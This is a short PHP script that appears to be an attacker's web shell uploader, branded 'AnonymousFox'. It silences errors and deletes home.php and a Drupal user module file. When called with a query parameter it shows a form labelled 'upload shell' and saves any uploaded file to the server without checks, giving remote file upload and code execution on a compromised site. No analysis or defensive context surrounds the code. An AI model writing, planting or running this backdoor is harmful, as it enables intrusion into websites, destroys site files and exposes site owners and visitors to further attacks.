<?php
error_reporting(0);
echo "AnonymousFox ";

if(file_exists("home.php")){
	unlink("home.php");
}

if(file_exists("modules/user/user.pages.inc")){
	unlink("modules/user/user.pages.inc");
}

$system = $_GET['f'];
if($system == 'f'){
$saw1 = $_FILES['file']['tmp_name'];
$saw2 = $_FILES['file']['name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='upload shell' />
</form>";
move_uploaded_file($saw1,$saw2);
}
?>